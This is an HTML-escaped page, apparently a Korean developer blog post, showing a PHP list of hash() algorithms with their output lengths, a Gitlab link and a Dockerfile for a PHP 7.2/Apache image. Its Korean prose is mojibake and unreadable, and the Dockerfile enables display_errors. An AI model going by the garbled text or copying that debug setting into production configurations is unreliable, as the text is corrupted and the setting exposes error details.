    &lt;span class=&quot;nv&quot;&gt;$ripemd128&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ripemd128&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 32&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ripemd160&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ripemd160&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 40&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ripemd256&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ripemd256&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 64&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ripemd320&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ripemd320&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 80&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$whirlpool&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;whirlpool&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 128&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$tiger128_3&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tiger128,3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 32&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$tiger160_3&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tiger160,3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 40&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$tiger192_3&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tiger192,3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 48&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$tiger128_4&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tiger128,4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 32&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$tiger160_4&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tiger160,4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 40&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$tiger192_4&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tiger192,4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 48&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$snefru&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;snefru&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 64&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$gost&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;           &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 64&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$adler32&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;adler32&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 8&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$crc32&lt;/span&gt;              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;crc32&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 8&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$crc32b&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;crc32b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 8&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval128_3&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval128,3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 32&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval160_3&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval160,3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 40&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval192_3&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval192,3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 48&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval224_3&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval224,3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 56&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval256_3&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval256,3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 64&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval128_4&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval128,4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 32&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval160_4&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval160,4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 40&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval192_4&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval192,4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 48&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval224_4&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval224,4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 56&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval256_4&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval256,4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 64&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval128_5&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval128,5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 32&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval160_5&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval160,5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 40&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval192_5&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval192,5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 48&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval224_5&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval224,5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 56&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$haval256_5&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haval256,5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 64&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* hash end */&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;..............................&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ë„ˆë¬´&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ê¸¸ì–´ì„œ&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ìƒëµ&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ì „ì²´&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ì½”ë“œëŠ”&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Gitlabì—ì„œ&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ì°¸ì¡°&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;í•´ì£¼ì„¸ìš”&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;index.php&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://git.d0ngd0nge.xyz:3005/dongdonge_public_project/web_encode/blob/master/src/index.php&quot;&gt;PHP ALL Source Gitlab Link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;PHP ìì²´ì—ì„œ ì§€ì›í•´ì£¼ëŠ” En/Decode ë° hashëŠ” Default Functionë¥¼ ì‚¬ìš©í–ˆì§€ë§Œ ì§€ì›í•˜ì§€ ì•ŠëŠ” í•¨ìˆ˜ëŠ” ë³„ë„ì˜ func.php íŒŒì¼ë¡œ ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ë¥¼ ìƒì„±í•˜ì—¬ ë¡œì§ì„ êµ¬í˜„ í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;dockerfile-example&quot;&gt;[Dockerfile Example]&lt;/h2&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-docker highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Server version: Apache/2.4.38 (Debian)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#       Server built:   2019-10-15T19:53:42&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# PHP 7.2.29 (cli) (built: Mar 31 2020 19:37:48) ( NTS )&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#       Copyright (c) 1997-2018 The PHP Group&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#       Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; php:7.2-apache&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;LABEL&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; DongDongE=&quot;DongDongE@d0ngd0nge.xyz&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;ARG&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; apache_pwd=/etc/apache2&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;ARG&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; php_ini=/usr/local/etc/php&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; entrypoint.sh /sbin/entrypoint.sh&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;WORKDIR&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; /var/log/apache2/&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;apt-get update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\
&lt;/span&gt;    apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;git wget unzip net-tools vim &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\
&lt;/span&gt;    docker-php-ext-install mysqli &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\
&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;php_ini&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/php.ini-production &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;php_ini&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/php.ini &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\
&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ri&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/#ServerName www.example.com/ServerName localhost/g'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;apache_pwd&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/sites-available/000-default.conf &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;
    sed -ri 's/#AddDefaultCharset UTF-8/AddDefaultCharset UTF-8/g' ${apache_pwd}/conf-available/charset.conf &amp;amp;&amp;amp; \
    sed -ri 's/short_open_tag = Off/short_open_tag = On/g' ${php_ini}/php.ini &amp;amp;&amp;amp; \
    sed -ri 's/display_errors = Off/display_errors = On/g' ${php_ini}/php.ini &amp;amp;&amp;amp; \
    rm -rf /var/log/apache2/* &amp;amp;&amp;amp; \
    touch access.log error.log other_vhosts_access.log &amp;amp;&amp;amp; \
    chown root:root /var/www/html -R &amp;amp;&amp;amp; \
    chown root:root /var/log/apache2 -R &amp;amp;&amp;amp; \
    chmod 700 /var/log/apache2 -R &amp;amp;&amp;amp; \
    apt-get clean &amp;amp;&amp;amp; \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*s &amp;amp;&amp;amp; \
    chmod 700 /sbin/entrypoint.sh

